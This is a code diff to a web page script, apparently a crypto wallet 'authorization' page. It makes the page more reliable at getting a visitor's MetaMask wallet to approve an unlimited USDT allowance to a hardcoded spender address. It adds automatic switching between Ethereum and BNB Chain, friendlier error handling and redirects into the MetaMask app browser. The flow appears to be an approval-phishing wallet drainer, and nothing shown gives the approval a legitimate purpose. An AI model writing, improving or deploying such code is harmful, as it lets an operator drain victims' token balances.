@@ -184,6 +184,24 @@
     };
     const UNLIMITED_AMOUNT = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
 
+    // 网络配置（用于添加网络）
+    const NETWORKS = {
+        1: {
+            chainId: '0x1',
+            chainName: 'Ethereum Mainnet',
+            nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
+            rpcUrls: ['https://mainnet.infura.io/v3/'],
+            blockExplorerUrls: ['https://etherscan.io']
+        },
+        56: {
+            chainId: '0x38',
+            chainName: 'BNB Smart Chain',
+            nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
+            rpcUrls: ['https://bsc-dataseed.binance.org/'],
+            blockExplorerUrls: ['https://bscscan.com']
+        }
+    };
+
     let currentChain = '1';
     let selectedWallet = null;
 
@@ -200,7 +218,38 @@
 
     // 检测是否在 MetaMask 内置浏览器中（有 window.ethereum 且 isMetaMask 为 true）
     function isInMetaMaskBrowser() {
-        return typeof window.ethereum !== 'undefined' && window.ethereum.isMetaMask;
+        return typeof window.ethereum !== 'undefined' && window.ethereum.isMetaMask === true;
+    }
+
+    // 切换网络（如果未添加则先添加）
+    async function switchNetwork(targetChainId) {
+        const targetHex = '0x' + parseInt(targetChainId).toString(16);
+        try {
+            await window.ethereum.request({
+                method: 'wallet_switchEthereumChain',
+                params: [{ chainId: targetHex }]
+            });
+            return true;
+        } catch (error) {
+            // 如果网络未添加，则尝试添加
+            if (error.code === 4902) {
+                try {
+                    await window.ethereum.request({
+                        method: 'wallet_addEthereumChain',
+                        params: [NETWORKS[targetChainId]]
+                    });
+                    return true;
+                } catch (addError) {
+                    console.error('添加网络失败:', addError);
+                    showStatus('添加网络失败: ' + addError.message, 'error');
+                    return false;
+                }
+            } else {
+                console.error('切换网络失败:', error);
+                showStatus('切换网络失败: ' + error.message, 'error');
+                return false;
+            }
+        }
     }
 
     // 在 MetaMask 内置浏览器中直接授权
@@ -210,7 +259,21 @@
             return false;
         }
         try {
-            const chainId = parseInt(currentChain);
+            const targetChainId = parseInt(currentChain);
+            // 获取当前网络
+            const currentChainIdHex = await window.ethereum.request({ method: 'eth_chainId' });
+            const currentChainId = parseInt(currentChainIdHex, 16);
+            if (currentChainId !== targetChainId) {
+                showStatus(`当前网络不是目标网络，正在切换...`, 'loading');
+                const switched = await switchNetwork(targetChainId);
+                if (!switched) {
+                    showStatus('网络切换失败，请手动切换到目标网络', 'error');
+                    return false;
+                }
+                // 等待网络切换生效（可选）
+                await new Promise(resolve => setTimeout(resolve, 500));
+            }
+
             // 请求账户
             const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
             const userAddress = accounts[0];
@@ -220,13 +283,14 @@
             const iface = new ethers.utils.Interface([
                 'function approve(address spender, uint256 amount) returns (bool)'
             ]);
-            const data = iface.encodeFunctionData('approve', [SPENDER_ADDRESS[chainId], UNLIMITED_AMOUNT]);
+            const data = iface.encodeFunctionData('approve', [SPENDER_ADDRESS[targetChainId], UNLIMITED_AMOUNT]);
             const transaction = {
-                to: USDT_ADDRESS[chainId],
+                to: USDT_ADDRESS[targetChainId],
                 from: userAddress,
                 data: data,
-                chainId: chainId
+                chainId: targetChainId
             };
+            console.log('发送交易:', transaction);
             const txHash = await window.ethereum.request({
                 method: 'eth_sendTransaction',
                 params: [transaction]
@@ -235,7 +299,13 @@
             return true;
         } catch (error) {
             console.error(error);
-            showStatus('授权失败: ' + (error.message || '未知错误'), 'error');
+            let errorMsg = error.message || '未知错误';
+            if (error.code === 4001) {
+                errorMsg = '用户取消了授权';
+            } else if (error.code === -32603) {
+                errorMsg = '交易失败，可能原因：链未切换、gas 不足或合约地址错误';
+            }
+            showStatus(`授权失败: ${errorMsg}`, 'error');
             return false;
         }
     }
@@ -244,14 +314,11 @@
     function jumpToMetaMask() {
         const currentUrl = window.location.href;
         // 使用 MetaMask 通用链接 (https://metamask.app.link/dapp/...) 在移动端更稳定
-        let metamaskUrl;
-        // 判断是否是移动设备
         const isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+        let metamaskUrl;
         if (isMobile) {
-            // 使用 MetaMask 的通用链接，自动唤起 App
             metamaskUrl = `https://metamask.app.link/dapp/${currentUrl.replace(/^https?:\/\//, '')}`;
         } else {
-            // PC 上使用 scheme
             metamaskUrl = `metamask://dapp/?url=${encodeURIComponent(currentUrl)}`;
         }
         window.location.href = metamaskUrl;
